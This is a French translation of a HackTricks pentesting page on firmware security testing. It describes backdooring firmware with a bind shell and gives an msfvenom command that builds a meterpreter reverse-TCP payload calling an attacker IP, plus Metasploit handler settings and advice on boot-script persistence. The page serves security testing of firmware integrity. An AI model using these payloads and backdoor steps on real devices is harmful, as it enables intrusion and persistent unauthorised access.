<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


### Cette page a été copiée depuis [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Tentative de **téléchargement de micrologiciel personnalisé et/ou de binaires compilés** pour détecter des failles d'intégrité ou de signature. Par exemple, compilez un shell de liaison de porte dérobée qui démarre au démarrage en suivant les étapes suivantes.

1. Extraire le micrologiciel avec firmware-mod-kit (FMK)
2. Identifier l'architecture et l'endianness du micrologiciel cible
3. Construire un compilateur croisé avec Buildroot ou utiliser d'autres méthodes adaptées à votre environnement
4. Utiliser le compilateur croisé pour construire la porte dérobée
5. Copier la porte dérobée dans le micrologiciel extrait /usr/bin
6. Copier le binaire QEMU approprié dans le rootfs du micrologiciel extrait
7. Émuler la porte dérobée en utilisant chroot et QEMU
8. Se connecter à la porte dérobée via netcat
9. Supprimer le binaire QEMU du rootfs du micrologiciel extrait
10. Repackager le micrologiciel modifié avec FMK
11. Tester le micrologiciel avec porte dérobée en l'émulant avec l'outil d'analyse de micrologiciel (FAT) et en se connectant à l'adresse IP et au port de la porte dérobée cible à l'aide de netcat

Si un shell root a déjà été obtenu à partir d'une analyse dynamique, d'une manipulation de chargeur d'amorçage ou de moyens de test de sécurité matérielle, tentez d'exécuter des binaires malveillants précompilés tels que des implants ou des shells inversés. Considérez l'utilisation d'outils de charge utile/implant automatisés utilisés pour les frameworks de commande et de contrôle (C\&C). Par exemple, le framework Metasploit et 'msfvenom' peuvent être exploités en suivant les étapes suivantes.

1. Identifier l'architecture et l'endianness du micrologiciel cible
2. Utiliser `msfvenom` pour spécifier la charge utile cible appropriée (-p), l'adresse IP de l'hôte attaquant (LHOST=), le numéro de port d'écoute (LPORT=), le type de fichier (-f), l'architecture (--arch), la plate-forme (--platform linux ou windows), et le fichier de sortie (-o). Par exemple, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transférer la charge utile sur le périphérique compromis (par exemple, exécuter un serveur web local et wget/curl la charge utile sur le système de fichiers) et s'assurer que la charge utile a des autorisations d'exécution
4. Préparer Metasploit pour gérer les demandes entrantes. Par exemple, démarrer Metasploit avec msfconsole et utiliser les paramètres suivants en fonction de la charge utile ci-dessus : use exploit/multi/handler,
   * `set payload linux/armle/meterpreter_reverse_tcp`
   * `set LHOST 192.168.1.245 #adresse IP de l'hôte attaquant`
   * `set LPORT 445 #peut être n'importe quel port inutilisé`
   * `set ExitOnSession false`
   * `exploit -j -z`
5. Exécuter le shell inverse meterpreter sur le périphérique compromis
6. Observer les sessions meterpreter ouvertes
7. Effectuer des activités d'exploitation postérieures

Si possible, identifier une vulnérabilité dans les scripts de démarrage pour obtenir un accès persistant à un périphérique à travers les redémarrages. De telles vulnérabilités surviennent lorsque les scripts de démarrage font référence, [liens symboliques](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), ou dépendent du code situé dans des emplacements montés non fiables tels que les cartes SD, et les volumes flash utilisés pour stocker des données en dehors des systèmes de fichiers racine.
